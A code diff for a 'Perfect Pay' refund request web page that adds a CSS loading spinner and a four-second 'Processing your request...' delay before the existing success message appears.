@@ -101,6 +101,33 @@
       font-weight: 500;
       max-width: 350px;
     }
+    .loading-wrapper {
+      width: 100%;
+      height: 60vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .loading-circle {
+      border: 6px solid #eaf3ff;
+      border-top: 6px solid #4f8cff;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 18px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .loading-text {
+      color: #2563eb;
+      font-size: 1.1rem;
+      font-weight: 500;
+      text-align: center;
+    }
     @media (max-width: 500px) {
       .refund-container {
         padding: 16px 4px;
@@ -143,6 +170,10 @@
       </label>
       <button class="refund-button" type="submit">Request Refund</button>
     </form>
+    <div class="loading-wrapper" id="loadingWrapper" style="display:none;">
+      <div class="loading-circle"></div>
+      <div class="loading-text">Processing your request...</div>
+    </div>
     <div class="refund-success-wrapper" id="successWrapper" style="display:none;">
       <img src="perfectlogo.png" alt="Perfect Pay Logo" class="refund-logo" style="margin-bottom: 16px; margin-top: 0;" />
       <div class="refund-success" id="successMsg">Your refund request has been sent. You will be credited within 7 days.</div>
@@ -154,7 +185,11 @@
       document.getElementById('refundForm').style.display = 'none';
       document.getElementById('successTitle').style.display = 'none';
       document.getElementById('successLogo').style.display = 'none';
-      document.getElementById('successWrapper').style.display = 'flex';
+      document.getElementById('loadingWrapper').style.display = 'flex';
+      setTimeout(function() {
+        document.getElementById('loadingWrapper').style.display = 'none';
+        document.getElementById('successWrapper').style.display = 'flex';
+      }, 4000);
     });
   </script>
 </body>
